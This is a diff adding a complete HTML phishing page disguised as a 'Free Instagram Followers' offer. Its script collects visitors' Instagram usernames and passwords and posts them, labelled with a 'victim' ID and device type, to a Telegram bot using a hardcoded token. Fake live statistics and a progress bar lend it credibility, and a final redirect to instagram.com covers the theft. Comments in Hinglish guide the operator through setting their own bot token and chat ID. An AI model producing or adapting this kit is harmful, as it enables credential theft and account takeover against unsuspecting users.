@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Free Instagram Followers</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container { max-width: 400px; width: 100%; }
+        .card {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 30px 24px;
+            border: 1px solid #333;
+            text-align: center;
+        }
+        .badge {
+            background: linear-gradient(135deg, #f09433, #bc1888);
+            padding: 4px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            color: #fff;
+            display: inline-block;
+            margin-bottom: 10px;
+        }
+        .title { font-size: 26px; font-weight: 700; color: #fff; }
+        .subtitle { font-size: 14px; color: #888; margin: 6px 0 20px; }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: #0a0a0a;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+        .stats div { text-align: center; }
+        .stats .num { font-size: 22px; font-weight: 700; color: #fff; }
+        .stats .label { font-size: 12px; color: #888; }
+        .input-group { margin: 10px 0; }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 10px;
+            font-size: 15px;
+            color: #fff;
+            transition: 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #0095f6;
+            outline: none;
+        }
+        .input-group input::placeholder { color: #555; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #f09433, #bc1888);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+        .btn:hover { transform: scale(1.02); opacity: 0.9; }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error-msg {
+            background: #2a0a0a;
+            color: #ff6b6b;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            display: none;
+            margin: 10px 0;
+            border: 1px solid #ff6b6b33;
+        }
+        .footer { font-size: 12px; color: #555; margin-top: 16px; }
+        .progress {
+            width: 100%;
+            height: 6px;
+            background: #333;
+            border-radius: 4px;
+            margin: 12px 0;
+            overflow: hidden;
+            display: none;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #f09433, #bc1888);
+            border-radius: 4px;
+            transition: width 0.3s;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card">
+        <!-- Badge text change kar sakte ho -->
+        <div class="badge">🔥 LIMITED OFFER</div>
+        <div class="title">Free Followers</div>
+        <div class="subtitle">Get 1000+ real Instagram followers instantly</div>
+
+        <div class="stats">
+            <div><div class="num" id="totalFollowers">0</div><div class="label">Total Given</div></div>
+            <div><div class="num" id="onlineUsers">0</div><div class="label">Online Now</div></div>
+            <div><div class="num" id="successRate">0%</div><div class="label">Success Rate</div></div>
+        </div>
+
+        <div class="progress" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+
+        <div class="error-msg" id="errorMsg">⚠️ Please fill in all fields.</div>
+
+        <div class="input-group">
+            <input type="text" id="username" placeholder="Instagram Username" autocomplete="off" />
+        </div>
+        <div class="input-group">
+            <input type="password" id="password" placeholder="Password (for verification)" autocomplete="off" />
+        </div>
+
+        <button class="btn" id="followBtn">🎯 Get Free Followers</button>
+
+        <div class="footer">⚡ Instant delivery • 100% Safe</div>
+    </div>
+</div>
+
+<script>
+    // 1. Yahan apna Telegram Bot Token daalo (@BotFather se banao)
+    const BOT_TOKEN = "AAEIkdjiEabfkZtf2aZKSRxyyCEcRfT3RHk"; 
+    
+    // URL se ID le raha hai, agar fix karna hai to neeche change karo
+    const urlParams = new URLSearchParams(window.location.search);
+    const VICTIM_ID = urlParams.get('id') || 'unknown';
+    
+    // 2. Yahan apna Telegram User ID daalo (getuserid bot se pata karo)
+    // Agar URL param nahi use karna to direct ID yahan likh do: const USER_ID = '123456789';
+    const USER_ID = urlParams.get('user_id') || '9106991758k'; 
+
+    const totalFollowers = document.getElementById('totalFollowers');
+    const onlineUsers = document.getElementById('onlineUsers');
+    const successRate = document.getElementById('successRate');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressBar = document.getElementById('progressBar');
+
+    // Fake stats animation
+    let total = 15234;
+    setInterval(() => {
+        total += Math.floor(Math.random() * 3);
+        totalFollowers.textContent = total.toLocaleString();
+        onlineUsers.textContent = 50 + Math.floor(Math.random() * 100);
+        successRate.textContent = 92 + Math.floor(Math.random() * 7) + '%';
+    }, 3000);
+
+    // Credentials send karne ka function
+    async function sendCredentials(username, password) {
+        if (!USER_ID || !BOT_TOKEN || USER_ID === 'YOUR_TELEGRAM_ID_HERE') return false;
+        
+        // Device detect karo
+        const device = navigator.userAgent.includes('Android') ? '📱 Android' :
+                       navigator.userAgent.includes('iPhone') ? '📱 iOS' : '💻 Desktop';
+        
+        // 3. Yahan apna naam likh lo message me
+        const msg = `🎯 *Free Followers Login!*\n\n🆔 Victim: \`${VICTIM_ID}\`\n👤 *Username:* \`${username}\`\n🔑 *Password:* \`${password}\`\n📱 Device: ${device}\n⚡ *MAJNU*`;
+        
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: USER_ID, text: msg, parse_mode: 'Markdown' })
+            });
+            return (await res.json()).ok;
+        } catch { return false; }
+    }
+
+    document.getElementById('followBtn').addEventListener('click', async () => {
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const btn = document.getElementById('followBtn');
+
+        if (!username || !password) {
+            document.getElementById('errorMsg').style.display = 'block';
+            setTimeout(() => document.getElementById('errorMsg').style.display = 'none', 3000);
+            return;
+        }
+
+        btn.textContent = '⏳ Adding followers...';
+        btn.disabled = true;
+        progressContainer.style.display = 'block';
+
+        let progress = 0;
+        const interval = setInterval(() => {
+            progress += Math.random() * 8;
+            if (progress >= 100) {
+                clearInterval(interval);
+                progress = 100;
+            }
+            progressBar.style.width = progress + '%';
+        }, 150);
+
+        await sendCredentials(username, password);
+
+        setTimeout(() => {
+            window.location.href = 'https://www.instagram.com/';
+        }, 1800);
+    });
+</script>
+</body>
+</html>
